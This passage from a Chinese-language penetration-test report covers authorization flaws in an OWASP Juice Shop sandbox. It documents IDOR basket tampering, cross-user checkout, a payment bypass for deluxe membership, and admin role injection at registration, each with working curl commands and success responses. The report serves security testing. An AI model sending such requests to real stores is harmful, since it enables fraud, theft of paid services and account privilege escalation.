curl -s -i "http://juice-shop.sandbox.local:3001/api/BasketItems/1" \
  -H "Authorization: Bearer [CUSTOMER_TOKEN]"
# 查看其他用户的购物篮项目
```

2. 查看原始数量（2个项目）
3. 修改数量：
```bash
curl -s -i -X PUT "http://juice-shop.sandbox.local:3001/api/BasketItems/1" \
  -H "Authorization: Bearer [CUSTOMER_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"quantity": 5}'
# 修改其他用户的购物篮项目数量
```

4. 接收修改确认：
```json
{
  "status": "success",
  "data": {
    "ProductId": 1,
    "BasketId": 1,
    "id": 1,
    "quantity": 5,
    "updatedAt": "2025-09-22T19:17:21.994Z"
  }
}
# 成功修改其他用户的购物篮项目
```

**影响证明:**
- **跨用户修改** - 将另一个用户的购物篮项目数量从2更改为5
- **财务影响** - 增加了其他用户的总数3倍的额外项目
- **时间戳确认** - updatedAt字段确认成功修改
- **购物中断** - 对用户预期购买的未授权更改

### AUTHZ-VULN-08: 跨用户购物篮结账

**摘要:**
- **漏洞位置:** POST /rest/basket/:id/checkout端点
- **概述:** 用户可以为其他用户的购物篮结账并完成订单
- **影响:** 未授权的订单完成和潜在的财务欺诈
- **严重性:** 高

**前提条件:**
有效的认证令牌（任何角色）

**利用步骤:**

1. 识别目标购物篮（属于用户ID 2的购物篮ID 2）
2. 尝试为另一个用户的购物篮结账：
```bash
curl -s -i -X POST "http://juice-shop.sandbox.local:3001/rest/basket/2/checkout" \
  -H "Authorization: Bearer [CUSTOMER_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{}'
# 为其他用户的购物篮结账
```

3. 接收成功的订单确认：
```json
{
  "orderConfirmation": "4b18-43fe98bb0ee5172c"
}
# 成功为其他用户的购物篮完成结账
```

**影响证明:**
- **未授权订单完成** - 结账了属于用户ID 2的购物篮
- **订单确认生成** (4b18-43fe98bb0ee5172c)
- **财务工作流绕过** - 为另一个用户完成了购买过程
- **跨用户交易** 无所有权验证

### AUTHZ-VULN-09: 豪华会员支付绕过

**摘要:**
- **漏洞位置:** POST /rest/deluxe-membership端点
- **概述:** 无需完成支付即可升级为豪华会员
- **影响:** 服务盗窃和无需支付的权限提升
- **严重性:** 高

**前提条件:**
有效的客户认证令牌

**利用步骤:**

1. 以普通客户身份认证
2. 尝试无需支付的豪华升级：
```bash
curl -s -i -X POST "http://juice-shop.sandbox.local:3001/rest/deluxe-membership" \
  -H "Authorization: Bearer [CUSTOMER_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{}'
# 无需支付升级为豪华会员
```

3. 接收成功的升级确认：
```json
{
  "status": "success",
  "data": {
    "confirmation": "Congratulations! You are now a deluxe member!",
    "token": "[NEW_DELUXE_JWT_TOKEN_WITH_ELEVATED_ROLE]"
  }
}
# 成功升级为豪华会员
```

**影响证明:**
- **支付绕过** - 无需支付信息或处理
- **角色提升** - JWT令牌现在包含"deluxe"角色而不是"customer"
- **有效的豪华令牌颁发** - 可以访问豪华功能和定价
- **服务盗窃** - 无需支付获得付费会员资格

### AUTHZ-VULN-10: 管理员访问的注册工作流绕过

**摘要:**
- **漏洞位置:** POST /api/Users端点（注册工作流）
- **概述:** 绕过预期的注册验证步骤以获得管理员权限
- **影响:** 通过跳过安全验证完全权限提升
- **严重性:** 严重

**前提条件:**
无 - 利用公共注册端点

**利用步骤:**

此漏洞通过与AUTHZ-VULN-06相同的利用方式展示，其中管理员角色注入绕过了预期的注册工作流，该工作流应包括：
- 电子邮件验证步骤
- 安全问题验证
- 管理员审批流程
- 多步验证工作流

该漏洞直接注入管理员角色，无需完成任何验证步骤：

```bash
curl -s -i -X POST "http://juice-shop.sandbox.local:3001/api/Users" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "workflow-bypass@evil.com",
    "password": "Password123!",
    "passwordRepeat": "Password123!",
    "role": "admin"
  }'
# 绕过注册工作流，直接注入admin角色
```

**影响证明:**
- **工作流绕过** - 无需电子邮件验证、验证码或顺序验证
- **无需任何审批或验证流程获得管理员权限**
- **安全控制规避** - 跳过了预期的多步注册过程
- **直接权限注入** 绕过所有预期的安全工作流

---

**授权利用完成**

所有10个授权漏洞均已成功利用，有具体证据证明未授权访问、权限提升和工作流绕过。该应用程序展示了跨水平权限提升（IDOR）、垂直权限提升（角色注入）和基于上下文的工作流绕过的系统性授权失败。